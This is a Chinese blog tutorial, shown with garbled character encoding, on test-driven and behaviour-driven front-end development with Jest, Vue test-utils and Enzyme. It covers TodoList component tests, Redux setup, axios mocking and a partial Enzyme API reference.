Header ç»„ä»¶æµ‹è¯•ç”¨ä¾‹å…ˆè¡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041// Header.test.jsimport &#123; shallowMount &#125; from '@vue/test-utils'import Header from '@/components/Header/Header.vue'describe('æµ‹è¯• Header ç»„ä»¶', () =&gt; &#123; it('Header åŒ…å« Input æ¡†', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') expect(input.exists()).toBe(true) &#125;) it('Header ä¸­ Input åˆå§‹å†…å®¹ä¸ºç©º', () =&gt; &#123; const wrapper = shallowMount(Header) const inputValue = wrapper.vm.$data.inputValue expect(inputValue).toBe('') &#125;) it('Header ä¸­ Input æ¡†å€¼å‘ç”Ÿå˜åŒ–ï¼Œå€¼åº”è¯¥ä¹Ÿè·Ÿç€æ”¹å˜', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('laibh') const inputValue = wrapper.vm.$data.inputValue expect(inputValue).toBe('laibh') &#125;) it('Header ä¸­ Input æ¡†è¾“å…¥å›žè½¦ï¼Œæ— å†…å®¹æ—¶æ— ååº”', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('') input.trigger('keyup.enter') expect(wrapper.emitted().add).toBeFalsy() &#125;) it('Header ä¸­ Input æ¡†è¾“å…¥å›žè½¦ï¼Œæœ‰å†…å®¹æ—¶å‘å¤–è§¦å‘äº‹ä»¶,åŒæ—¶æ¸…ç©º inputValue', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('laibh') input.trigger('keyup.enter') expect(wrapper.emitted().add).toBeTruthy() expect(wrapper.vm.$data.inputValue).toBe('') &#125;)&#125;) æ ¹æ®æµ‹è¯•ç”¨ä¾‹å†™ä»£ç  1234567891011121314151617181920212223242526272829// Header.vue&lt;template&gt; &lt;div&gt; &lt;input data-test=&quot;input&quot; v-model=&quot;inputValue&quot; @keyup.enter=&quot;addTodoItem&quot; /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;Header&quot;, props: &#123;&#125;, data() &#123; return &#123; inputValue: &quot;&quot; &#125;; &#125;, methods: &#123; addTodoItem() &#123; if (this.inputValue) &#123; this.$emit(&quot;add&quot;, this.inputValue); this.inputValue = &quot;&quot;; &#125; &#125; &#125;&#125;;&lt;/script&gt;&lt;style scoped lang=&quot;less&quot;&gt;&lt;/style&gt; æµ‹è¯•è¦†ç›–çŽ‡12345678910// jest.config.jsmodule.exports = &#123; collectCoverageFrom: ['**/*.&#123;js,vue&#125;', '!**/node_modules/**'],&#125;// package.json "scripts": &#123; "test:cov": "vue-cli-service test:unit --coverage" &#125;, React TDDEnzymegithub 12# å®‰è£… npm i --save-dev enzyme enzyme-adapter-react-16 åŒæ ·ï¼Œshallowé€‚åˆå•å…ƒæµ‹è¯•ï¼Œmountåˆ™æ˜¯é›†æˆæµ‹è¯• ä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930313233// App.jeimport React from 'react';function App() &#123; return ( // ä½¿ç”¨çš„data-test=xxx ç­‰å±žæ€§å¯ä»¥åšåˆ°è§£è€¦ï¼Œä¸ä¼šå› ä¸ºæ”¹å˜æ ·å¼åè€Œå‘ç”Ÿæ”¹å˜ï¼Œå¦å¤–ä¹Ÿä¸ä¼šè¢«hashæŽ‰ &lt;div className="app-container" title="laibh" data-test="container"&gt; hello world &lt;/div&gt; );&#125;export default App;// App.test.jsimport React from 'react';import App from './App';import Enzyme, &#123; shallow &#125; from 'enzyme';import Adapter from 'enzyme-adapter-react-16';Enzyme.configure(&#123; adapter: new Adapter() &#125;);it('renders without crashing', () =&gt; &#123; const wrapper = shallow(&lt;App /&gt;) // è¾“å‡ºæ•´ä¸ªå†…å®¹å­—ç¬¦ä¸² console.log(wrapper.debug()) /** &lt;div className="app-container" title="laibh" data-test="container"&gt; hello world &lt;/div&gt; */ expect(wrapper.find('[data-test="container"]').length).toBe(1) expect(wrapper.find('[data-test="container"]').prop('title')).toBe('laibh')&#125;); å¦å¤–å®ƒæµ·åŸŸä¸€äº›æ‰©å±• APIï¼Œä¾‹å¦‚ jest-enzymeï¼Œè®©è¯­æ³•æ˜“æ‡‚ç®€æ´ 123456789101112131415161718// App.test.jsimport React from 'react';import App from './App';import Enzyme, &#123; shallow &#125; from 'enzyme';import Adapter from 'enzyme-adapter-react-16';Enzyme.configure(&#123; adapter: new Adapter() &#125;);it('renders without crashing', () =&gt; &#123; const wrapper = shallow(&lt;App /&gt;) console.log(wrapper.debug()) const container = wrapper.find('[data-test="container"]') expect(container.length).toBe(1) expect(container.prop('title')).toBe('laibh') // ç­‰åŒä¸Šé¢ä¸¤å¥ expect(container).toExist() expect(container).toHaveProp('title', 'laibh')&#125;); åˆ«å¿˜è®°åœ¨ jest.config.jsé‡Œé¢è¿›è¡Œé…ç½® 123module.exports = &#123; setupFilesAfterEnv: ['./node_modules/jest-enzyme/lib/index.js'],&#125; å¼€å‘ Header ç»„ä»¶åŒæ ·æµ‹è¯•å…ˆè¡Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import React from 'react';import Header from '../../index';import &#123; shallow &#125; from 'enzyme';let wrapper;let inputElem;describe('æµ‹è¯• Header ç»„ä»¶', () =&gt; &#123; beforeEach(() =&gt; &#123; wrapper = shallow(&lt;Header /&gt;) inputElem = wrapper.find('[data-test="input"]') &#125;) it('æ­£å¸¸æ¸²æŸ“', () =&gt; &#123; expect(wrapper).toMatchSnapshot() &#125;); it('åŒ…å«ä¸€ä¸ª input', () =&gt; &#123; expect(inputElem).toExist() &#125;); it('inputåˆå§‹åŒ–å†…å®¹åº”è¯¥ä¸ºç©º', () =&gt; &#123; expect(inputElem.prop('value')).toBe('') &#125;); it('å½“ç”¨æˆ·è¾“å…¥æ—¶ï¼Œinputå†…å®¹ä¼šè·Ÿç€å˜åŒ–', () =&gt; &#123; const value = 'å“ˆå“ˆå“ˆ' inputElem.simulate('change', &#123; target: &#123; value &#125; &#125;) expect(wrapper.state('value')).toBe(value) &#125;); it('å½“ç”¨æˆ·è¾“å…¥åŽï¼Œé”®å…¥å›žè½¦ï¼Œå¦‚æžœ input æ²¡æœ‰å†…å®¹ï¼Œåˆ™ä¸æ“ä½œ', () =&gt; &#123; const fn = jest.fn(); const wrapper = shallow(&lt;Header addUndoItem=&#123;fn&#125; /&gt;) wrapper.setState(&#123; value: '' &#125;) const inputElem = wrapper.find('[data-test="input"]') inputElem.simulate('keyUp', &#123; keyCode: 13 &#125;) expect(fn).not.toBeCalled() &#125;); it('å½“ç”¨æˆ·è¾“å…¥åŽï¼Œé”®å…¥å›žè½¦ï¼Œå¦‚æžœ input æœ‰å†…å®¹ï¼ŒaddUndoItemåº”è¯¥è¢«è°ƒç”¨,ç„¶åŽinputè¢«æ¸…ç©º', () =&gt; &#123; const fn = jest.fn(); const wrapper = shallow(&lt;Header addUndoItem=&#123;fn&#125; /&gt;) const value = 'haha'; wrapper.setState(&#123; value &#125;) const inputElem = wrapper.find('[data-test="input"]') inputElem.simulate('keyUp', &#123; keyCode: 13 &#125;) expect(fn).toBeCalled() expect(fn).toBeCalledWith(value) const newInputElem = wrapper.find('[data-test="input"]') expect(newInputElem.prop('value')).toBe('') &#125;);&#125;); æ ¹æ®æµ‹è¯•å†™ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445import React, &#123; Component &#125; from 'react';import styles from './index.less'class Header extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; value: '' &#125; &#125; handleInputKeyUp = (e) =&gt; &#123; const &#123; value &#125; = this.state; const &#123; addUndoItem &#125; = this.props; if (e.keyCode === 13 &amp;&amp; value) &#123; addUndoItem(value) this.setState(&#123; value: '' &#125;) &#125; &#125; handleInputChange = (e) =&gt; &#123; this.setState(&#123; value: e.target.value &#125;) &#125; render() &#123; const &#123; value &#125; = this.state; return ( &lt;div className=&#123;styles.header&#125;&gt; &lt;div className=&#123;styles.headerContent&#125;&gt; TodoList &lt;input className=&#123;styles.headerInput&#125; data-test='input' value=&#123;value&#125; onChange=&#123;this.handleInputChange&#125; onKeyUp=&#123;this.handleInputKeyUp&#125; placeholder='Add Todo' /&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125;export default Header; TDD å°ç»“ä¼˜åŠ¿ï¼šä»£ç è´¨é‡æé«˜ å•å…ƒæµ‹è¯• æµ‹è¯•è¦†ç›–çŽ‡é«˜ï¼Œä¸šåŠ¡è€¦åˆåº¦é«˜ï¼Œä»£ç é‡å¤§ï¼Œè¿‡äºŽç‹¬ç«‹ BDDï¼ˆè¡Œä¸ºé©±åŠ¨å¼€å‘ï¼‰å…¨ç§°ï¼šBehavior Driven Development é›†æˆæµ‹è¯•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// vue integration/todoList import &#123; mount &#125; from '@vue/test-utils'import TodoList from '../../TodoList' it(` 1.ç”¨æˆ·ä¼šåœ¨ headerè¾“å…¥æ¡†è¾“å…¥å†…å®¹ 2.ç”¨æˆ·ä¼šç‚¹å‡»å›žè½¦æŒ‰é’® 3.åˆ—è¡¨é¡¹åº”è¯¥å¢žåŠ ç”¨æˆ·è¾“å…¥å†…å®¹çš„åˆ—è¡¨é¡¹ `, () =&gt; &#123; const wrapper = mount(&lt;TodoList /&gt;); const inputElem = wrapper.findAll('[data-test="header-input"]').at(0) const content = 'haha' inputElem.setValue(content) inputElem.trigger('change') inputElem.trigger('keyup.enter') const listItems = wrapper.findAll('[data-test="list-item"]').at(0) expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(content) &#125;)// react integration/todoList import React from 'react';import &#123; mount &#125; from 'enzyme';import TodoList from './../../index';describe('é›†æˆæµ‹è¯•ï¼šTodoList', () =&gt; &#123; let wrapper; beforeEach(() =&gt; &#123; wrapper = mount(&lt;TodoList /&gt;) &#125;) it(` 1.ç”¨æˆ·ä¼šåœ¨ headerè¾“å…¥æ¡†è¾“å…¥å†…å®¹ 2.ç”¨æˆ·ä¼šç‚¹å‡»å›žè½¦æŒ‰é’® 3.åˆ—è¡¨é¡¹åº”è¯¥å¢žåŠ ç”¨æˆ·è¾“å…¥å†…å®¹çš„åˆ—è¡¨é¡¹ `, () =&gt; &#123; const value = 'haha' const headerInput = wrapper.find('[data-test="header-input"]') headerInput.simulate('change', &#123; target: &#123; value &#125; &#125;) // æŒ‰ä¸‹å›žè½¦é”®ï¼ŒkeyCodeä¸º13 headerInput.simulate('keyUp', &#123; keyCode: 13 &#125;) // undoListItem const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(value) &#125;)&#125;) TDD ä¸Ž BDD æ¯”è¾ƒTDD å…ˆå†™æµ‹è¯•å†å†™ä»£ç  ä¸€èˆ¬ç»“åˆå•å…ƒæµ‹è¯•ä½¿ç”¨ï¼Œæ˜¯ç™½ç›’æµ‹è¯• æµ‹è¯•é‡ç‚¹åœ¨ä»£ç  å®‰å…¨æ„Ÿä½Ž é€Ÿåº¦å¿« BDD å…ˆå†™ä»£ç å†å†™æµ‹è¯• ä¸€èˆ¬ç»“åˆé›†æˆæµ‹è¯•ä½¿ç”¨ï¼Œæ˜¯é»‘ç›’æµ‹è¯• æµ‹è¯•é‡ç‚¹åœ¨ UI (DOM) å®‰å…¨æ„Ÿé«˜ é€Ÿåº¦æ…¢ Reduxç›¸å…³æµ‹è¯•å¢žåŠ  redux åœ¨é¡¹ç›® createStore 1234567891011// src/store/createStoreimport &#123; createStore, combineReducers &#125; from 'redux'import &#123; reducer as todoReducer &#125; from '../containers/TodoList/store'const reducer = combineReducers(&#123; todo: todoReducer&#125;)const store = createStore(reducer, window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());export default store; store/actions.js 123456import &#123; CHANGE_INPUT_VALUE &#125; from './constants';export const changeInputValue = value =&gt; (&#123; type: CHANGE_INPUT_VALUE, value&#125;) store/constants.js 1export const CHANGE_INPUT_VALUE = 'CHANGE_INPUT_VALUE' store/reducer.js 12345678910111213141516import &#123; CHANGE_INPUT_VALUE &#125; from './constants';const initialState = &#123; inputValue: ''&#125;export default (state = initialState, action) =&gt; &#123; switch (action.type) &#123; case CHANGE_INPUT_VALUE: return &#123; inputValue: action.value &#125;; default: return state; &#125;&#125; store/index.js 12345import reducer from './reducer'import * as actions from './actions'export &#123; reducer, actions &#125; TodoList/index.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import React, &#123; Component &#125; from 'react';import Header from './../../components/Header/index';import UndoList from './../../components/UndoList/index';import styles from './index.less'class TodoList extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; undoList: [] &#125; &#125; handledeleteItem = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.filter((item, itemIndex) =&gt; itemIndex !== index) this.setState(&#123; undoList: newList &#125;) &#125; handleStatusChange = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; // undoList.forEach((item, itemIndex) =&gt; &#123; // if (itemIndex === index) &#123; // Object.assign(item, &#123; status: 'input' &#125;) // return; // &#125; Object.assign(item, &#123; status: 'div' &#125;) // &#125;) const newList = undoList.map((item, itemIndex) =&gt; &#123; if (itemIndex === index) &#123; return &#123; ...item, status: 'input' &#125; &#125; return &#123; ...item, status: 'div' &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; handleBlur = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.map(item =&gt; &#123; return &#123; ...item, status: 'div' &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; handleInputValue = (index, value) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.map((item, itemIndex) =&gt; &#123; if (itemIndex === index) &#123; return &#123; ...item, value &#125; &#125; return &#123; ...item, &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; addUndoItem = (value) =&gt; &#123; const &#123; undoList &#125; = this.state; this.setState(&#123; undoList: [...undoList, &#123; status: 'div', value &#125;] &#125;) &#125; render() &#123; const &#123; undoList &#125; = this.state; return ( &lt;div className=&#123;styles.todoList&#125;&gt; &lt;Header addUndoItem=&#123;this.addUndoItem&#125; /&gt; &lt;UndoList list=&#123;undoList&#125; deleteItem=&#123;this.handledeleteItem&#125; changeStatus=&#123;this.handleStatusChange&#125; changeBlur=&#123;this.handleBlur&#125; valueChange=&#123;this.handleInputValue&#125; /&gt; &lt;/div&gt; ) &#125;&#125;export default TodoList; src/index.js 1234567891011import React from 'react';import ReactDOM from 'react-dom';import &#123; Provider &#125; from 'react-redux';import App from './App';import store from './store/createStore'ReactDOM.render(( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;), document.getElementById('root')); ç„¶åŽä¿®æ”¹é›†æˆæµ‹è¯•çš„æµ‹è¯•ç”¨ä¾‹ src/containers/TodoList/__test__/integration/TodoList.test.js 1234567891011121314151617181920212223242526272829303132333435363738394041import React from 'react';import &#123; mount &#125; from 'enzyme';import TodoList from './../../index';// å¢žåŠ çš„å†…å®¹import &#123; Provider &#125; from 'react-redux';import store from './../../../../store/createStore';describe('é›†æˆæµ‹è¯•ï¼šTodoList', () =&gt; &#123; let wrapper; beforeEach(() =&gt; &#123; wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; ) &#125;) it(` 1.ç”¨æˆ·ä¼šåœ¨ headerè¾“å…¥æ¡†è¾“å…¥å†…å®¹ 2.ç”¨æˆ·ä¼šç‚¹å‡»å›žè½¦æŒ‰é’® 3.åˆ—è¡¨é¡¹åº”è¯¥å¢žåŠ ç”¨æˆ·è¾“å…¥å†…å®¹çš„åˆ—è¡¨é¡¹ `, () =&gt; &#123; const value = 'haha' const headerInput = wrapper.find('[data-test="header-input"]') headerInput.simulate('change', &#123; target: &#123; value &#125; &#125;) // æŒ‰ä¸‹å›žè½¦é”®ï¼ŒkeyCodeä¸º13 headerInput.simulate('keyUp', &#123; keyCode: 13 &#125;) // undoListItem const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(value) &#125;)&#125;) å¼‚æ­¥ä»£ç compontDidMount1234567891011121314151617componentDidMount()&#123; /* &#123; data:[ &#123;status:'div',value:'haha'&#125;, ], success:true &#125; */ axios.get('/undoList.json').then(res=&gt;&#123; this.setState(&#123; undoList:res.data &#125;) &#125;).catch(e=&gt;&#123; console.log(e) &#125;)&#125; æ¨¡æ‹Ÿå‡½æ•° src/__mock__/axios.js 123456789101112131415const mockUndoList = &#123; data:[&#123; status:'div',value:'haha' &#125;], success:true&#125;export default &#123; get(url)&#123; if(url === '/undoList.json')&#123; return new Promise((resolve,reject)=&gt;&#123; resolve(mockUndoList) &#125;) &#125; &#125;&#125; æµ‹è¯•ç”¨ä¾‹ 12345678910111213141516171819202122232425it(` 1.ç”¨æˆ·æ‰“å¼€é¡µé¢ 2.åº”è¯¥å±•ç¤ºæŽ¥å£è¿”å›žçš„æ•°æ®`,(done)=&gt;&#123; const wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; // è§£å†³æ•°æ®å¼‚æ­¥é—®é¢˜ setTimeout(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;,0) // nodeçš„è¯­æ³• process.nextTick(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;) )&#125;) setTimeout12345678910111213141516171819componentDidMount()&#123; /* &#123; data:[ &#123;status:'div',value:'haha'&#125;, ], success:true &#125; */ setTimeout(()=&gt;&#123; axios.get('/undoList.json').then(res=&gt;&#123; this.setState(&#123; undoList:res.data &#125;) &#125;).catch(e=&gt;&#123; console.log(e) &#125;) &#125;,5000)&#125; æµ‹è¯•ç”¨ä¾‹ 1234567891011121314151617181920212223jest.useFakeTimers();it(` 1.ç”¨æˆ·æ‰“å¼€é¡µé¢ 2.åº”è¯¥å±•ç¤ºæŽ¥å£è¿”å›žçš„æ•°æ®`,(done)=&gt;&#123; const wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; expect(setTimeout).toHaveBeenCalledTimes(1); // è·‘å®Œæ‰€æœ‰ setTimeout çš„æ—¶é—´ jest.runAllTimers(); // è§£å†³æ•°æ®å¼‚æ­¥é—®é¢˜ setTimeout(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;,0) )&#125;) å‰ç«¯è‡ªåŠ¨åŒ–æµ‹è¯•çš„ä¼˜åŠ¿ æ›´å¥½çš„ä»£ç ç»„ç»‡ï¼Œé¡¹ç›®çš„å¯ç»´æŠ¤æ€§å¢žå¼º æ›´å°çš„bug å‡ºçŽ°æ¦‚çŽ‡ï¼Œå°¤å…¶æ˜¯å›žå½’æµ‹è¯•ä¸­çš„ Bug ä¿®æ”¹å·¥ç¨‹è´¨é‡å·®çš„é¡¹ç›®ï¼Œæ›´åŠ å®‰å…¨ é¡¹ç›®å…·å¤‡æ½œåœ¨çš„æ–‡æ¡£ç‰¹æ€§ æ‰©å¹¿å‰ç«¯çš„çŸ¥è¯†é¢ EnzymeEnzyme æ˜¯ React çš„ JavaScript æµ‹è¯•åº”ç”¨ç¨‹åºï¼Œå¯ä»¥è½»æ¾æµ‹è¯• React Components çš„è¾“å‡ºã€‚è¿˜å¯ä»¥åœ¨ç»™å®šè¾“å‡ºçš„æƒ…å†µä¸‹ï¼ŒéåŽ†ä»¥æŸç§æ–¹å¼æ¨¡æ‹Ÿè¿è¡Œã€‚ ä¸»è¦é€šè¿‡æ¨¡ä»¿ Jq ç”¨äºŽ DOM æ“ä½œå’ŒéåŽ† APIat(index).at(index) =&gt; shallowWrapper è¿”å›žå½“å‰ wrapper ä¸­æŒ‡å®šç´¢å¼•çš„èŠ‚ç‚¹ 12const wrapper = shallow(&lt;MyComponent /&gt;)expect(wrapper.find(foo).at(0).props().foo).toEqual('bar') first().first() =&gt; ShallowWrapper å°†åŒ¹é…èŠ‚ç‚¹é›†åˆå‡å°‘åˆ°é›†åˆä¸­çš„ç¬¬ä¸€ä¸ªï¼Œå°±åƒ.at(0)ã€‚ 1expect(wrapper.find(Foo).first().props().foo).to.equal('bar'); last().last() =&gt; ShallowWrapper å°†åŒ¹é…èŠ‚ç‚¹é›†å‡å°‘åˆ°é›†åˆä¸­çš„æœ€åŽä¸€ä¸ªï¼Œå°±åƒ.at(length - 1)ã€‚ 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).last().props().foo).to.equal('bar'); childAt(index).childAt(index) =&gt; ShallowWrapper è¿”å›žæŒ‡å®šç´¢å¼•çš„å­èŠ‚ç‚¹ 12const wrapper = shallow(&lt;TodoList items=&#123;items&#125;/&gt;);expect(wrapper.find('ul').childAt(0).type).toEqual('li') children([selector]).children([selector]) =&gt; ShallowWrapper è¿”å›žçˆ¶èŠ‚ç‚¹æŸä¸ªå…ƒç´ çš„æ‰€æœ‰å­èŠ‚ç‚¹ 12const wrapper = shallow(&lt;TodoList items=&#123;items&#125;/&gt;);expect(wrapper.find('ul').children.length).toEqual(items.length) closest(selector).closest(selector) =&gt; shallowWrapper é€šè¿‡éåŽ†èŠ‚ç‚¹ç¥–å…ˆï¼Œè¿”å›žç¬¬ä¸€ä¸ªç›¸åŒ¹é…çš„èŠ‚ç‚¹ 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).closest('.bar')).to.have.lengthOf(1); contains(nodeOrNodes).contains(nodeOrNodes) =&gt; Boolean è¿”å›žæ‰€æœ‰ç»™å®šçš„reactå…ƒç´ æ˜¯å¦ä¸Žæ¸²æŸ“æ ‘ä¸­çš„å…ƒç´ åŒ¹é…ã€‚å®ƒå°†é€šè¿‡æ£€æŸ¥æœŸæœ›å…ƒç´ æ˜¯å¦ä¸ŽåŒ…è£…å™¨å…ƒç´ å…·æœ‰ç›¸åŒçš„ props å¹¶å…±äº«ç›¸åŒçš„å€¼æ¥ç¡®å®šåŒ…è£…å™¨ä¸­çš„å…ƒç´ æ˜¯å¦ä¸Žé¢„æœŸå…ƒç´ åŒ¹é…ã€‚ 12345678910111213141516171819202122232425262728293031let wrapper;wrapper = shallow(( &lt;div&gt; &lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt; &lt;/div&gt;));expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.contains(&lt;div data-foo="foo"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar" data-baz="baz"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="Hello"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar" /&gt;)).to.equal(false);wrapper = shallow(( &lt;div&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;div&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.contains([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true);expect(wrapper.contains([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;World&lt;/div&gt;,])).to.equal(false); containsAllMatchingElements(patternNodes).containsAllMatchingElements(patternNodes) =&gt; Boolean è¿”å›žæ‰€æœ‰ç»™å®šçš„reactå…ƒç´ æ˜¯å¦patternNodesä¸ŽåŒ…è£…å™¨çš„æ¸²æŸ“æ ‘ä¸­çš„å…ƒç´ åŒ¹é…ã€‚æ¯ä¸ªå…ƒç´ patternNodeså¿…é¡»åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚åŒ¹é…éµå¾ªè§„åˆ™containsMatchingElementã€‚ 12345678910111213const style = &#123; fontSize: 13 &#125;;const wrapper = shallow(( &lt;div&gt; &lt;span className="foo"&gt;Hello&lt;/span&gt; &lt;div style=&#123;style&#125;&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.containsAllMatchingElements([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true); containsAnyMatchingElements(patternNodes).containsAnyMatchingElements(patternNodes) =&gt; Boolean è¿”å›žè‡³å°‘ä¸€ä¸ªç»™å®šçš„reactå…ƒç´ æ˜¯å¦patternNodesä¸ŽåŒ…è£…å™¨çš„æ¸²æŸ“æ ‘ä¸­çš„å…ƒç´ åŒ¹é…ã€‚ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ patternNodeså¿…é¡»åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚åŒ¹é…éµå¾ªè§„åˆ™containsMatchingElementã€‚ 12345678910111213const style = &#123; fontSize: 13 &#125;;const wrapper = shallow(( &lt;div&gt; &lt;span className="foo"&gt;Hello&lt;/span&gt; &lt;div style=&#123;style&#125;&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.containsAnyMatchingElements([ &lt;span&gt;Bonjour&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true); containsMatchingElement(patternNode).containsMatchingElement(patternNode) =&gt; Boolean è¿”å›žpatternNodereactå…ƒç´ æ˜¯å¦ä¸Žæ¸²æŸ“æ ‘ä¸­çš„ä»»ä½•å…ƒç´ åŒ¹é…ã€‚ 123456789101112const wrapper = shallow(( &lt;div&gt; &lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt; &lt;/div&gt;));expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar" data-baz="baz"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="Hello"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar" /&gt;)).to.equal(false); context([key])è¿”å›žåŒ…è£…å™¨æ ¹èŠ‚ç‚¹çš„ä¸Šä¸‹æ–‡å“ˆå¸Œã€‚å¯é€‰åœ°ä¼ å…¥ä¸€ä¸ªpropsï¼Œå®ƒå°†åªè¿”å›žè¯¥å€¼ã€‚ 123456const wrapper = shallow( &lt;MyComponent /&gt;, &#123; context: &#123; foo: 10 &#125; &#125;,);expect(wrapper.context().foo).to.equal(10);expect(wrapper.context('foo')).to.equal(10); debug([options]).debug([options]) =&gt; String è¿”å›žåŒ…è£…å™¨çš„ç±»ä¼¼HTMLçš„å­—ç¬¦ä¸²ï¼Œä»¥ä¾¿è¿›è¡Œè°ƒè¯•ã€‚å½“æµ‹è¯•æ²¡æœ‰é€šè¿‡æ—¶ï¼Œæ‰“å°åˆ°æŽ§åˆ¶å°å¾ˆæœ‰ç”¨ã€‚ optionsï¼ˆObject[å¯é€‰]ï¼‰ï¼š options.ignorePropsï¼šï¼ˆBoolean[å¯é€‰]ï¼‰ï¼šæ˜¯å¦åº”åœ¨ç»“æžœå­—ç¬¦ä¸²ä¸­çœç•¥propsã€‚é»˜è®¤æƒ…å†µä¸‹åŒ…å«é“å…·ã€‚ options.verboseï¼šï¼ˆBoolean[å¯é€‰]ï¼‰ï¼šæ˜¯å¦åº”è¯¥è¯¦ç»†æ‰“å°ä½œä¸ºé“å…·ä¼ é€’çš„æ•°ç»„å’Œå¯¹è±¡ã€‚ dive([options]).dive([options]) =&gt; ShallowWrapper æµ…å‘ˆçŽ°å½“å‰åŒ…è£…å™¨çš„ä¸€ä¸ªéžDOMå­é¡¹ï¼Œå¹¶è¿”å›žç»“æžœå‘¨å›´çš„åŒ…è£…å™¨ã€‚å®ƒå¿…é¡»æ˜¯å•èŠ‚ç‚¹åŒ…è£…å™¨ï¼Œå¹¶ä¸”è¯¥èŠ‚ç‚¹å¿…é¡»æ˜¯Reactç»„ä»¶ã€‚ æ³¨æ„ï¼šåªèƒ½åœ¨å•ä¸ªéžDOMç»„ä»¶å…ƒç´ èŠ‚ç‚¹çš„åŒ…è£…ä¸Šè°ƒç”¨ï¼Œå¦åˆ™ä¼šå¼•å‘é”™è¯¯ã€‚å¦‚æžœå¿…é¡»ä½¿ç”¨å¤šä¸ªå­èŠ‚ç‚¹å¯¹åŒ…è£…å™¨è¿›è¡Œæµ…åŒ…è£…ï¼Œè¯·ä½¿ç”¨.shallowï¼ˆï¼‰ 123456789101112131415161718function Bar() &#123; return ( &lt;div&gt; &lt;div className="in-bar" /&gt; &lt;/div&gt; );&#125;function Foo() &#123; return ( &lt;div&gt; &lt;Bar /&gt; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Foo /&gt;);expect(wrapper.find('.in-bar')).to.have.lengthOf(0);expect(wrapper.find(Bar)).to.have.lengthOf(1);expect(wrapper.find(Bar).dive().find('.in-bar')).to.have.lengthOf(1); equals(node).equals(node) =&gt; Boolean è¿”å›žå½“å‰åŒ…è£…å™¨æ ¹èŠ‚ç‚¹å‘ˆçŽ°æ 